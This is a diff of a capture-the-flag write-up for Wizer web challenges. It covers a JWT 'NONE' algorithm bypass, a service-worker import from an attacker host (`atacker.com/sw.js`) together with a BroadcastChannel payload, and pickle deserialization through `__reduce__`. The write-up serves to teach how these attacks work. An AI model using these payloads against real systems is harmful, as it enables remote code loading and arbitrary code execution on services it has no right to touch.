@@ -68,7 +68,7 @@ app.listen(3000, () => {
 
 This code will check if the "token" is present in the request body's JSON data, which should be a JWT token.
 
-The code will accept 'NONE' algo and it will check for `{"access":"flag"}` in jwt payload data.
+The code will accept 'NONE' algo to verify JWT token and it will check for `{"access":"flag"}` in jwt payload data.
 
 now we need to create jwt token with `NONE` algo and `{"access":"flag"}` as data.
 
@@ -238,8 +238,8 @@ importScripts('/utils.js');
 importScripts(`/${getParameterByName('sw')}`);
 ```
 
-It will import the serviceWorker from value of sw since we can control it we can import our own serviceWorker with `sw=\\atacker.com\sw.js` 
-this will get file from `https://atacker.com\sw.js`
+It will import the serviceWorker from value of `sw` since we can control it we can import our own serviceWorker with `sw=\\atacker.com/sw.js`. \
+This will get the file from `https://atacker.com/sw.js`
 
 now to craft our serviceWorker take a look at this
 
@@ -254,7 +254,7 @@ so in serviceWorker we create a new BroadcastChannel instance using the same nam
 `const channel = new BroadcastChannel('recipebook');` \
 Use the postMessage() method on the BroadcastChannel instance to send a message with a message property: `channel.postMessage({ message: 'Wizer' });`
 
-xss.js
+serviceWorker payload:
 ```js
 const channel = new BroadcastChannel('recipebook');
 channel.postMessage({ message: 'Wizer' });
@@ -278,7 +278,7 @@ https://events.wizer-ctf.com/?mode=sw&color=\\aftab700.pythonanywhere.com/api/xs
 
 <details><summary markdown="span">Click to see code :diamond_shape_with_a_dot_inside: </summary>
 
-```Python
+```python
 from flask import Flask, request, render_template
 import pickle
 import base64
@@ -328,8 +328,15 @@ if __name__ == '__main__':
 ![image](https://github.com/Aftab700/Writeups/assets/79740895/e1a9a542-c019-45ff-8f29-1901a0346a4c)
 
 
-Here if GET parameter `load_object` is present it will pass it to `pickle.loads(base64.b64decode(load_object))`. \
+Here if GET parameter `load_object` is present it will pass it to `pickle.loads(base64.b64decode(load_object))`. 
+
+`pickle.loads()` is used to unpickle (deserialize) the data and takes a variable containing byte stream as a valid argument.
+
 It is vulnerable to pickle insecure deserialization.
+
+To exploit this vulnerability, we will use `__reduce__` method. \
+`__reduce__` allows you to define a custom way to reconstruct the object during deserialization. It can be used for execution of arbitrary 
+code during deserialization
 
 I wasted so much time on payload making because i was using `os.system` but it didn't work at last `subprocess.Popen` worked
 
